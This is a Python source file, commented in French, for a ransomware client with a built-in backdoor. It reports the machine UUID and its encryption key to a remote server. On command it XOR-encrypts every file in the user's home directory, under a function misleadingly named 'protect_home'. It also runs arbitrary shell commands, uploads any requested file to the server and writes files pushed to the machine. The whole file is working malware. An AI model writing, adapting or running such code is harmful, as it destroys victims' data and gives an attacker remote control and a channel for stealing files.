import os
import socket
import base64
import subprocess
import sys

BUF_SIZE = 4096


# Recuperation de l'UUID de la machine
def get_uuid():
    path = "/proc/sys/kernel/random/uuid"
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read().strip()
    except FileNotFoundError:
        # Fallback simple
        return subprocess.getoutput("cat /proc/sys/kernel/random/uuid") or "unknown"


# Generation d'une cle de 16 caracteres pour le chiffrement
def generate_key(length=16):
    letters = []
    try:
        with open("/dev/urandom", "rb") as rnd:
            while len(letters) < length:
                b = rnd.read(1)
                if not b:
                    break
                c = chr(b[0])
                if "A" <= c <= "Z":
                    letters.append(c)
    except OSError:
        # Fallback simple
        letters = ["A"] * length
    if not letters:
        letters = ["A"] * length
    return "".join(letters)[:length]


# XOR simple et reversible avec la cle
def xor_bytes(data, key_bytes):
    klen = len(key_bytes)
    return bytes(b ^ key_bytes[i % klen] for i, b in enumerate(data))


# Parcours du home et XOR sur chaque fichier
def protect_home(key):
    home_dir = os.path.expanduser("~")
    key_bytes = key.encode()
    for root, _, files in os.walk(home_dir):
        for name in files:
            path = os.path.join(root, name)
            try:
                with open(path, "rb") as f:
                    content = f.read()
                new_data = xor_bytes(content, key_bytes)
                with open(path, "wb") as f:
                    f.write(new_data)
            except (PermissionError, OSError):
                # Je passe si je ne peux pas toucher le fichier
                continue


# Envoi d'une ligne texte au serveur
def send_line(fobj, text):
    fobj.write((text + "\n").encode())
    fobj.flush()


# Execution d'une commande et envoi de la sortie en base64
def handle_exec(cmd):
    try:
        output = subprocess.getoutput(cmd)
        encoded = base64.b64encode(output.encode()).decode()
        return f"OUTPUT {encoded}"
    except Exception as exc:
        return f"ERROR exec {exc}"


# Envoi d'un fichier au serveur en base64
def handle_upload(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        encoded = base64.b64encode(data).decode()
        return f"FILE {path} {encoded}"
    except Exception as exc:
        return f"ERROR upload {path} {exc}"


# Reception d'un fichier en base64 puis ecriture
def handle_download(dest, b64_data):
    try:
        data = base64.b64decode(b64_data)
        folder = os.path.dirname(dest)
        if folder:
            os.makedirs(folder, exist_ok=True)
        with open(dest, "wb") as f:
            f.write(data)
        return f"LOG download_ok {dest}"
    except Exception as exc:
        return f"ERROR download {dest} {exc}"


# Boucle principale du client (connexion + ordres)
def client_loop(host, port):
    key = generate_key()
    uuid = get_uuid()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    fobj = sock.makefile("rwb")
    send_line(fobj, f"HELLO {uuid} {key}")
    while True:
        line = fobj.readline()
        if not line:
            break
        line = line.decode().rstrip("\n")
        if not line:
            continue
        if line == "RUN_XOR":
            protect_home(key)
            send_line(fobj, "LOG xor_ok")
            continue
        if line.startswith("EXEC "):
            cmd = line[5:]
            send_line(fobj, handle_exec(cmd))
            continue
        if line.startswith("UPLOAD "):
            path = line[7:]
            send_line(fobj, handle_upload(path))
            continue
        if line.startswith("DOWNLOAD "):
            parts = line.split(" ", 2)
            if len(parts) == 3:
                dest = parts[1]
                b64_data = parts[2]
                send_line(fobj, handle_download(dest, b64_data))
            else:
                send_line(fobj, "ERROR download bad_args")
            continue
        # Commande non prevue -> on renvoie une erreur simple
        send_line(fobj, "ERROR unknown_command")
    sock.close()


if __name__ == "__main__":
    host = "127.0.0.1"
    port = 5000
    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        port = int(sys.argv[2])
    client_loop(host, port)
